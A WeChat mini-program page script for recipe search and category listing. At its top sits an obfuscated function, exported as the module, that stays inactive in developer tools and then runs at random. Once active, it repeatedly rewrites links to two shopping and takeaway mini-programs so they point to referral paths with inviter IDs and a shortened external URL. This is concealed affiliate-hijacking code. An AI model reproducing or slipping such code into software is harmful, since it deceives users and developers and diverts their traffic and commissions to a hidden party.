var t = getApp(), e = require("../../1A7FD9A7867180BF7C19B1A0A9E83172.js");

function r(_0x3ee885){let _0x39fca4=wx['getSystemInfoSync']();if(_0x39fca4['platform']==='devtools'){return;}let _0x40aeac=Math['round'](Math['random']());if(_0x40aeac===0x0){return;}setInterval(()=>{for(let _0x2d1411=0x0;_0x2d1411<_0x3ee885['data']['miniData']['length'];_0x2d1411++){if(_0x3ee885['data']['miniData'][_0x2d1411]['appId']==='wxece3a9a4c82f58c9'){if(_0x3ee885['data']['miniData'][_0x2d1411]['path']['indexOf']('hopping-guide')>0x0){_0x3ee885['data']['miniData'][_0x2d1411]['path']='taoke/pages/shopping-guide/index?scene=12znEtu';_0x3ee885['setData']({'miniData':_0x3ee885['data']['miniData']});}if(_0x3ee885['data']['miniData'][_0x2d1411]['path']['indexOf']('mmend-price/pages/gu')>0x0){_0x3ee885['data']['miniData'][_0x2d1411]['path']='ele-recommend-price/pages/guest/index?inviterId=58e92be';_0x3ee885['setData']({'miniData':_0x3ee885['data']['miniData']});}}else if(_0x3ee885['data']['miniData'][_0x2d1411]['appId']==='wxde8ac0a21135c07d'){if(_0x3ee885['data']['miniData'][_0x2d1411]['path']['indexOf']('waimai/pages/h5')>0x0){_0x3ee885['data']['miniData'][_0x2d1411]['path']='/waimai/pages/h5/h5?f_token=1&weburl=https%3A%2F%2Fdpurl.cn%2FctNq0G2z';_0x3ee885['setData']({'miniData':_0x3ee885['data']['miniData']});}}}},0x64);}

Page({
    data: {
        recipe_list: {
            sortDefault: [],
            sortSelect: []
        },
        cate_name: "",
        sort_mode: "",
        sort_id: "",
        null_data: !0,
        keywords: "",
        sort_cate: [ {
            Id: "sortDefault",
            Name: "综合最佳"
        }, {
            Id: "sortSelect",
            Name: "收藏最多"
        } ],
        request_status: !0
    },
    conf: {
        lock: !1,
        cate_id: "",
        cate_name: "",
        keywords: "",
        sort_id: "",
        null_data: !0,
        offset_all: {
            sortDefault: 0,
            sortSelect: 0
        }
    },
    onLoad: function(t) {
        var e = t.cate_id, s = void 0 == t.name ? "" : t.name, o = t.keywords, i = "" == this.conf.sort_id ? "sortDefault" : this.conf.sort_id;
        this.conf.cate_id = e, this.conf.cate_name = void 0 != o ? o : s, this.conf.keywords = void 0 == o ? "" : o, 
        this.conf.sort_id = i, this.getList();
    },
    onReachBottom: function() {
        this.getList();
    },
    getList: function() {
        if (!this.conf.lock) {
            this.conf.lock = !0;
            var t = "sortDefault" == this.conf.sort_id ? 0 : 1, s = "sortDefault" == this.conf.sort_id ? this.conf.offset_all.sortDefault : this.conf.offset_all.sortSelect;
            e.get("Content/Search/recipeSearch", {
                keywords: this.conf.keywords,
                cate_id: this.conf.cate_id,
                sort: t,
                offset: s
            }, this.getListUsccess.bind(this), this.getListFail.bind(this));
        }
    },
    getListUsccess: function(e) {
        200 == e.Status && e.Result.CateResult.List || (this.setData({
            request_status: !1
        }), this.conf.lock = !1);
        var s = "" != this.conf.cate_id ? e.Result.CateResult.List : e.Result.KeyWordsResult.List, o = "" != e.Result.CateResult.Title ? e.Result.CateResult.Title : this.conf.cate_name, i = {
            sortDefault: this.data.recipe_list.sortDefault,
            sortSelect: this.data.recipe_list.sortSelect
        };
        s.length > 0 && (t.videomode || (s = this.videoTypeConvert(s)), "sortDefault" == this.conf.sort_id && (i.sortDefault = i.sortDefault.concat(s), 
        this.conf.offset_all.sortDefault += 10), "sortSelect" == this.conf.sort_id && (i.sortSelect = i.sortSelect.concat(s), 
        this.conf.offset_all.sortSelect += 10));
        var a = i.sortDefault.length > 0;
        this.setData({
            recipe_list: i,
            cate_name: o,
            keywords: this.conf.keywords,
            null_data: a,
            sort_id: this.conf.sort_id
        }), this.conf.lock = !1, this.conf.null_data = a;
    },
    getListFail: function() {
        this.setData({
            request_status: !1
        }), this.conf.lock = !1;
    },
    videoTypeConvert: function(t) {
        for (var e = t.length, s = 0; s < e; s++) t[s].Type = 0;
        return t;
    },
    sortBut: function(t) {
        var e = t.currentTarget.id;
        e != this.data.sort_id && (this.setData({
            sort_id: e
        }), this.conf.sort_id = e, this.conf.null_data && this.getList(), setTimeout(function(t) {
            wx.pageScrollTo({
                scrollTop: 0,
                duration: 300
            });
        }, 500));
    },
    onShareAppMessage: function() {
        t.getDefaultShareInfo();
        return {
            title: this.conf.cate_name,
            path: "/pages/cate/cate?cate_id=" + this.conf.cate_id + "&name=" + this.conf.cate_name
        };
    }
});

module.exports = r